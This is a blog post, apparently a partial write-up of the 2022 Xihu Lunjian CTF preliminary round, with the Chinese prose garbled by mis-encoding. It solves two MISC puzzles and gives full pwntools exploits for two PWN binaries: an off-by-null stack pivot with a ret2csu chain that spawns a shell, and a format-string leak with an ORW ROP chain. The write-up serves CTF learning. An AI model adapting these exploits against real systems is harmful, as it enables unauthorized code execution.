<!DOCTYPE html><html lang="zh-CN"><head><title>2022å¹´è¥¿æ¹–è®ºå‰‘åˆèµ› éƒ¨åˆ†é¢˜è§£</title><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="stylesheet" href="/css/highlight/xcode.min.css"><link rel="stylesheet" href="/css/bootstrap/bootstrap-tooltips.css"><link rel="stylesheet" href="/css/post.css"><script src="/js/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body><script>if (/mobile/i.test(navigator.userAgent) || /android/i.test(navigator.userAgent)) {
  document.body.classList.add('mobile')
}</script><div><div class="inner"><h1>2022å¹´è¥¿æ¹–è®ºå‰‘åˆèµ› éƒ¨åˆ†é¢˜è§£</h1><div class="time">2023-02-18</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-%E2%80%93-%E7%AD%BE%E5%88%B0%E9%A2%98%E5%96%B5%EF%BC%9A"><span class="toc-text">MISC â€“ ç­¾åˆ°é¢˜å–µï¼š</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-%E2%80%93-mp3"><span class="toc-text">MISC â€“ mp3:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-%E2%80%93-babycalc"><span class="toc-text">PWN â€“ babycalc :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN-%E2%80%93-Message-Board"><span class="toc-text">PWN â€“ Message Board</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%EF%BC%9A"><span class="toc-text">ç›¸å…³èµ„æ–™ï¼š</span></a></li></ol><h2 id="MISC-â€“-ç­¾åˆ°é¢˜å–µï¼š"><a href="#MISC-â€“-ç­¾åˆ°é¢˜å–µï¼š" class="headerlink" title="MISC â€“ ç­¾åˆ°é¢˜å–µï¼š"></a>MISC â€“ ç­¾åˆ°é¢˜å–µï¼š</h2><p>å›¾ç‰‡æœ«å°¾æœ‰äº›å¥‡æ€ªæ•°æ®ï¼š</p>
<pre><code>E7BB99E8BF99E4B8AAE585ACE4BC97E58FB7E58F91E98081EFBC9AE2809CE8A5BFE6B996E8AEBAE5899132303233E68891E69DA5E4BA86EFBC81E2809DE88EB7E5BE9720666C6167E38082
</code></pre>
<p>16è¿›åˆ¶UTF-8è§£ç å¾—ï¼š<code>ç»™è¿™ä¸ªå…¬ä¼—å·å‘é€ï¼šâ€œè¥¿æ¹–è®ºå‰‘2023æˆ‘æ¥äº†ï¼â€è·å¾— flagã€‚</code></p>
<br>

<h2 id="MISC-â€“-mp3"><a href="#MISC-â€“-mp3" class="headerlink" title="MISC â€“ mp3:"></a>MISC â€“ mp3:</h2><p>ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ï¼Œå‘ç°ç»“å°¾çš„æ ‡è¯†ç¬¦ä¸ºPngçš„ï¼Œæ‰‹åŠ¨CVæå‡ºæ•°æ®ä¿å­˜ä¸ºpngå›¾ç‰‡ï¼ˆbinwalk -Meæä¸å‡ºæ¥ï¼Œç–‘æƒ‘ï¼‰</p>
<p>å›¾ç‰‡ä¸ºé»‘ç™½å—ï¼Œç”¨è„šæœ¬è½¬é»‘ä¸º0ï¼Œç™½ä¸º1ï¼šï¼ˆä½¿ç”¨zstegä¹Ÿå¯ä»¥ï¼‰</p>
<pre><code class="python">from PIL import Image
import struct

pic = Image.open(&#39;cipher.png&#39;)
a, b = pic.size

fp = open(&#39;flag.zip&#39;, &#39;wb&#39;)
flag = &quot;&quot;
for y in range(b):
    for x in range(a):
        #flag += str(pic.getpixel((x, y))//255)
        if pic.getpixel((x, y)) == 0:
            flag += &quot;0&quot;
        if pic.getpixel((x, y)) == 255:
            flag += &quot;1&quot;

for i in range(0, len(flag), 8):
    fp.write(struct.pack(&#39;B&#39;, int(flag[i:i+8], 2)))
fp.close()
</code></pre>
<p>å¾—åˆ°ä¸€ä¸ªåŠ å¯†çš„zipæ–‡ä»¶ã€‚</p>
<p>å¯¹cipher.mp3æ–‡ä»¶ä½¿ç”¨MP3stegoè§£å¯†ï¼Œå¯†ç ä¸ºç©ºï¼š</p>
<p><code>.\Decode.exe -X .\cipher.mp3</code> </p>
<p>å¾—åˆ°zipçš„å¯†ç ï¼š<code>8750d5109208213f</code></p>
<p>zipé‡Œé¢æœ‰ä¸ª47.txtï¼Œä½¿ç”¨Rot47è¿›è¡Œè§£å¯†ã€‚</p>
<p>ç„¶åå†ä½¿ç”¨jjencodeè¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°flagã€‚</p>
<br>

<h2 id="PWN-â€“-babycalc"><a href="#PWN-â€“-babycalc" class="headerlink" title="PWN â€“ babycalc :"></a>PWN â€“ babycalc :</h2><pre><code class="c">// å…³é”®ä»£ç 
for ( i = 0; i &lt;= 15; ++i )
  &#123;
    printf(&quot;number-%d:&quot;, (unsigned int)(i + 1));
    buf[(int)read(0, buf, 0x100uLL)] = 0;       // off by null
    v0 = strtol(buf, 0LL, 10);                  // strtol: string -&gt; number
    *(&amp;v3 + i) = v0;
  &#125;
</code></pre>
<ul>
<li>å¯¹bufå†™å…¥æ•°æ®æ—¶ï¼Œå­˜åœ¨off by nullçš„æ¼æ´ï¼Œå¯ä»¥å°†rbpçš„æœ«å­—èŠ‚è¦†ç›–ä¸º\x00ï¼›</li>
<li>iä¸ºæœ‰ç¬¦å·å˜é‡ã€‚1ï¼‰å¯ä»¥è¦†å†™ä¸ºè´Ÿå€¼ï¼Œå¯¹æ ˆçš„æ­£æ–¹å‘ä»»æ„å†™ï¼›2ï¼‰å¤§äºç­‰äº15æ—¶ï¼Œå¯¹æ ˆçš„è´Ÿæ–¹å‘ï¼ˆret_addr, rbpä¸€æ–¹å‘ï¼‰ä»»æ„å†™ä¸€ä¸ªå­—èŠ‚æ•°æ®ï¼›</li>
</ul>
<p>åˆ©ç”¨æ€è·¯ï¼šæ ˆè¿ç§» + çˆ†æ ˆ</p>
<p>ä½¿ç”¨æ ˆçš„è´Ÿæ–¹å‘å†™æ•°æ®ï¼Œå°†è¿”å›åœ°å€æŒ‡å‘<code>nop</code>æ”¹ä¸ºæŒ‡å‘<code>leave; ret</code>ï¼Œä½¿ä¹‹æ ˆè¿ç§»ã€‚ä½†rbpåªèƒ½ä¿®æ”¹æœ«å­—èŠ‚ä¸º\x00ï¼Œä¸èƒ½å®Œå…¨æ§åˆ¶åˆ°ropé“¾çš„èµ·å§‹ï¼Œæ‰€ä»¥å¤šæ¬¡æ‰§è¡Œï¼ˆçˆ†æ ˆï¼Œæ¦‚ç‡ä¸º5/32ï¼‰ã€‚</p>
<p>ropé“¾ï¼šleak libc + ret2csuå†™å…¥system_addr + get shell</p>
<p>å½“ç„¶ï¼Œé¦–å…ˆéœ€è¦å¯¹ifçš„æ¡ä»¶æ±‚è§£æ–¹ç¨‹ã€‚å¯ä»¥æ‰‹ç®—ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨z3ã€‚</p>
<p>z3æ±‚è§£è„šæœ¬ï¼ˆç°å­¦çš„ï¼Œå†™å¾—å¾ˆèµ˜ä½™ï¼‰ï¼š</p>
<pre><code class="python">from z3 import *

v3 = Real(&#39;v3&#39;)
v4 = Real(&#39;v4&#39;)
v5 = Real(&#39;v5&#39;)
v6 = Real(&#39;v6&#39;)
v7 = Real(&#39;v7&#39;)
v8 = Real(&#39;v8&#39;)
v9 = Real(&#39;v9&#39;)
v10 = Real(&#39;v10&#39;)
v11 = Real(&#39;v11&#39;)
v12 = Real(&#39;v12&#39;)
v13 = Real(&#39;v13&#39;)
v14 = Real(&#39;v14&#39;)
v15 = Real(&#39;v15&#39;)
v16 = Real(&#39;v16&#39;)
v17 = Real(&#39;v17&#39;)
v18 = Real(&#39;v18&#39;)

s = Solver()
s.add(v5*v4*v3 - v6 == 36182)
s.add(v3 == 19)
s.add(v5*19*v4 + v6 == 36322)
s.add((v13+v3-v8)*v16 == 32835)
s.add((v4 * v3 - v5) * v6 == 44170)
s.add((v5 + v4 * v3) * v6 == 51590)
s.add(v9 * v8 * v7 - v10 == 61549)
s.add(v10 * v15 + v4 + v18 == 19037)
s.add(v9 * v8 * v7 + v10 == 61871)
s.add((v8 * v7 - v9) * v10 == 581693)
s.add(v11 == 50)
s.add((v9 + v8 * v7) * v10 == 587167)
s.add(v13 * v12 * v11 - v14 == 1388499)
s.add(v13 * v12 * v11 + v14 == 1388701)
s.add((v12 * v11 - v13) * v14 == 640138)
s.add((v11 * v5 - v16) * v12 == 321081)
s.add((v13 + v12 * v11) * v14 == 682962)
s.add(v17 * v16 * v15 - v18 == 563565)
s.add(v17 * v16 * v15 + v18 == 563571)
s.add(v14 == 101)
s.add((v16 * v15 - v17) * v18 == 70374)
s.add((v17 + v16 * v15) * v18 == 70518)

print(s.check())
print(s.model())
</code></pre>
<p>EXPï¼šï¼ˆåŸºäºLoÏ„Ï…så¸ˆå‚…çš„è¿›è¡Œä¿®æ”¹ï¼‰</p>
<pre><code class="python">from pwn import *
from LibcSearcher import *
context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)

# io = process(&quot;./babycalc&quot;)
elf = ELF(&quot;./babycalc&quot;)
libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)

pop6_ret = 0x400c9a
pop_rdi_ret = 0x400ca3
ret = 0x400ca4

num = [19,36,53,70,55,66,17,161,50,131,212,101,118,199,24,3]

def csu(rdi, rsi, rdx, call_addr):
    payload = p64(pop6_ret) + p64(0) + p64(1) + p64(call_addr) + p64(rdx) + p64(rsi) + p64(rdi) + p64(0x400c80) + p64(0)*7
    return payload

def pwn():
    payload = str(0x18).encode().ljust(0x8, b&#39;\x00&#39;)
    payload += p64(ret)*4  # ret chain
    payload += p64(pop_rdi_ret) + p64(elf.got[&#39;puts&#39;]) + p64(elf.plt[&#39;puts&#39;])  # leak libc
    payload += csu(0, elf.got[&#39;puts&#39;], 0x30, elf.got[&#39;read&#39;])   # system.plt -&gt; system.got
    payload += p64(pop_rdi_ret) + p64(elf.got[&#39;puts&#39;]+8) + p64(elf.plt[&#39;puts&#39;]) # get shell

    for i in range(0x10):
        payload += p8(num[i])

    payload = payload.ljust(0xfc, b&#39;\x00&#39;) + p32(0x38) # point to ret_addr

    io.recvuntil(&quot;number-&quot;)
    io.send(payload)
    puts_addr=u64(io.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(0x8,b&#39;\x00&#39;))
    print(hex(puts_addr))
    pause()

    libc_base = puts_addr - libc.sym[&#39;puts&#39;]
    system_addr = libc_base + libc.sym[&#39;system&#39;]
    io.send(p64(system_addr) + b&quot;/bin/sh\x00&quot;)
    sleep(1)
    io.interactive()

while True:
    io = process(&quot;./babycalc&quot;)
    try:
        pwn()
    except EOFError:
        io.close()
        continue
</code></pre>
<p>å‘ç°çˆ†æ ˆæœ‰æ—¶å€™å‡ºç°äº›é—®é¢˜ï¼š1ï¼‰æ‰§è¡Œæµå¡ä½ï¼› 2ï¼‰libcåœ°å€æ³„éœ²ä¸å¯¹ï¼›ğŸ˜¬</p>
<br>

<h2 id="PWN-â€“-Message-Board"><a href="#PWN-â€“-Message-Board" class="headerlink" title="PWN â€“ Message Board"></a>PWN â€“ Message Board</h2><p>å¼€äº†æ²™ç®±ï¼Œexecveè°ƒç”¨è¢«ç¦ç”¨ã€‚</p>
<pre><code class="c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
&#123;
  char *v3; // rax
  char buf[8]; // [rsp+0h] [rbp-C0h] BYREF
  char dest[8]; // [rsp+8h] [rbp-B8h] BYREF
  char v7[176]; // [rsp+10h] [rbp-B0h] BYREF

  Init();                                       // sandbox
  if ( !one )
  &#123;
    strcpy(dest, &quot;Hello, &quot;);
    puts(&quot;Welcome to DASCTF message board, please leave your name:&quot;);
    read(0, buf, 8uLL);
    one = 1;
  &#125;
  v3 = strcat(dest, buf);
  printf(v3);                                   // æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´
  puts(&quot;Now, please say something to DASCTF:&quot;);
  read(0, v7, 0xC0uLL);                         // å¯è¦†ç›–rbpã€ret_addr
  puts(&quot;Posted Successfully~&quot;);
  return 0LL;
&#125;
</code></pre>
<p>å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å’Œæ ˆæº¢å‡ºã€‚æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¯ä»¥ç›´æ¥æ³„éœ²å‡ºlibcåŸºå€ï¼Œç”±äºç¦ç”¨äº†execveï¼Œæ‰€ä»¥éœ€è¦ç”¨orwå¾—åˆ°flagã€‚ä½†æ ˆæº¢å‡ºä»…å¯æº¢å‡º0x10å­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦æ ˆè¿ç§»ã€‚</p>
<p>EXPï¼š</p>
<pre><code class="python">from pwn import *
context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)

io = process(&quot;./pwn&quot;)
libc = ELF(&quot;./libc.so.6&quot;)
elf = ELF(&quot;./pwn&quot;)
leave_ret = 0x4013a2
bss = 0x404080
pop_rdi = 0x401413
main = 0x401378

def debug():
    gdb.attach(io)
    pause()

io.recvuntil(&quot;please leave your name:&quot;)
io.sendline(&quot;%31$p&quot;)
io.recvuntil(&quot;Hello, &quot;)
addr = int(io.recvuntil(b&#39;\n&#39;)[:-1], 16) - 243
print(hex(addr))
# debug()

libc_base = addr - libc.sym[&quot;__libc_start_main&quot;]
read_addr = libc_base + libc.sym[&#39;read&#39;]
write_addr = libc_base + libc.sym[&#39;write&#39;]
open_addr = libc_base + libc.sym[&#39;open&#39;]
pop_rsi = libc_base + 0x2601f
pop_rdx = libc_base + 0x142c92

io.recvuntil(&quot;please say something to DASCTF:&quot;)
payload = b&#39;A&#39;*0xb0 + p64(bss+0x200) + p64(main)
io.send(payload)

payload = b&quot;./flag\x00\x00&quot; # 0x4041d0
payload += p64(pop_rdi)
payload += p64(0x4041d0)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(open_addr)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(0x404700)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(read_addr)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(0x404700)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(write_addr)
payload = payload.ljust(0xb0, b&quot;a&quot;)
payload += p64(0x4041d0)
payload += p64(leave_ret)
io.send(payload)
io.interactive()
</code></pre>
<br>

<h2 id="ç›¸å…³èµ„æ–™ï¼š"><a href="#ç›¸å…³èµ„æ–™ï¼š" class="headerlink" title="ç›¸å…³èµ„æ–™ï¼š"></a>ç›¸å…³èµ„æ–™ï¼š</h2><p>1ã€é¢˜ç›®ä¿¡æ¯ï¼š<a target="_blank" rel="noopener" href="https://github.com/Randark-JMT/CTF_Archive/tree/main/2022%20xhlj">https://github.com/Randark-JMT/CTF_Archive/tree/main/2022%20xhlj</a></p>
<p>2ã€å®˜æ–¹Pwné¢˜è§£ï¼š<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/1dBr_4y2RVf_hZyXIpcqyw">https://mp.weixin.qq.com/s/1dBr_4y2RVf_hZyXIpcqyw</a></p>
<p>3ã€å®˜æ–¹Miscé¢˜è§£ï¼š<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/GDn1Af-6toDCMEcxWf9j8g">https://mp.weixin.qq.com/s/GDn1Af-6toDCMEcxWf9j8g</a></p>
<p>4ã€å®˜æ–¹Reverseé¢˜è§£ï¼š<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/cuBCzVechH6R3WpEWv80Kg">https://mp.weixin.qq.com/s/cuBCzVechH6R3WpEWv80Kg</a></p>
<p>5ã€å®˜æ–¹Cryptoé¢˜è§£ï¼š<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/-TvP1PIUcQfoWKzmA_kBbQ">https://mp.weixin.qq.com/s/-TvP1PIUcQfoWKzmA_kBbQ</a></p>
<p>6ã€å®˜æ–¹Webé¢˜è§£ï¼š<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/BJ3_xmR0lDmGkaA9OBhGyg">https://mp.weixin.qq.com/s/BJ3_xmR0lDmGkaA9OBhGyg</a></p>
<p class="textAlignRight"><span>â†¶ </span><a href="/">è¿”å›é¦–é¡µ</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', '');</script></html>